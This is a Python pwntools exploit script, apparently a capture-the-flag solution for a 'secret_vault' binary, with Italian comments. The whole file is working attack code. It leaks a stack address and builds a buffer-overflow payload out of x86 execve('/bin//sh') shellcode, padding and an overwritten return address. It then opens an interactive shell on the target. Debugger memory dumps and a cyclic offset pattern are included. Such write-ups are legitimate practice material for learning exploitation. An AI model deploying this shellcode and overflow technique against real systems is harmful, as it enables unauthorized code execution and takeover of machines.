#! /usr/bin/env python3

# OSSERVAZIONI
# 
# 1 cifratura finisce a III non compreso
# 2 salta in LLL
from pwn import *
import subprocess
import struct
#first 64 bytes are xored
# param_1[local_c] = param_1[local_c] ^ *param_2;
def xorShell(shell, chiave):
    # chiave = chiave * 16
    chiave = chiave[-1:] * len(shell)
    return bytes([x ^ y for x,y in zip(shell, chiave)])
# 0x7ffd29393fb0: 0x52491515526afa0b      0xb3d9b35453581552
# 0x7ffd29393fc0: 0x0bbaf7318af8b3fb      0x3a3a3a3abaf77afa
# 0x7ffd29393fd0: 0x3a3a3a3a3a3a3a3a      0x3a3a3a3a3a3a3a3a
# 0x7ffd29393fe0: 0x3a3a3a3a3a3a3a3a      0x3a3a3a3a3a3a3a3a
# 0x7ffd29393ff0: 0x3a3a3a3a3a3a3a3a      0x0000000000000000

# 0x7ffd29393fb0: 0x52491515526afa0b      0xb3d9b35453581552
# 0x7ffd29393fc0: 0x0bbaf7318af8b3fb      0x3a3a3a3abaf77afa
# 0x7ffd29393fd0: 0x3a3a3a3a3a3a3a3a      0x3a3a3a3a3a3a3a3a
# 0x7ffd29393fe0: 0x3a3a3a3a3a3a3a3a      0x3a3a3a3a3a3a3a3a
# 0x7ffd29393ff0: 0x3a3a3a3a3a3a3a3a      0x0000000000000000


BUF_SIZE = 80

# conn = remote('vault.challs.olicyber.it', 10006)
conn = process("./secret_vault")

# context.terminal = ['terminator', '-e']
# gdb.attach(conn, gdbscript='''
# b *0x00401588
# c
# ''')



# prendiamo la chiave conoscendo il seed :D
key = subprocess.run(['./get_key'], stdout=subprocess.PIPE).stdout
key =  bytes.fromhex(hex(int(key))[2:])

conn.recvuntil('>')
conn.sendline('1')

conn.recvuntil(':')
conn.sendline("A")

# prendiamo l'addr 
conn.recvuntil('in ')
address = conn.recvline().strip()[2:-1].decode()
address = bytes.fromhex(address)

conn.recvuntil('>')
conn.sendline('1')

shell = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
# riempiamo il buffer con nop in modo da fare 
# overflow senza sminchiare tutto il payload 
nop = b"\x00" * (BUF_SIZE - len(shell))
# address = little_endian.convert(address)

# buildiamo il payload :)
payload = shell + nop + address[::-1]
# payload = xorShell(payload[:72], key) + payload[72:] #e.e
print(payload)

conn.recvuntil(':')
conn.sendline(payload)

# conn.recvuntil('>')
# conn.sendline('2')
# conn.interactive()

conn.recvuntil('>')
# conn.sendline('3')

conn.interactive()

# aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaa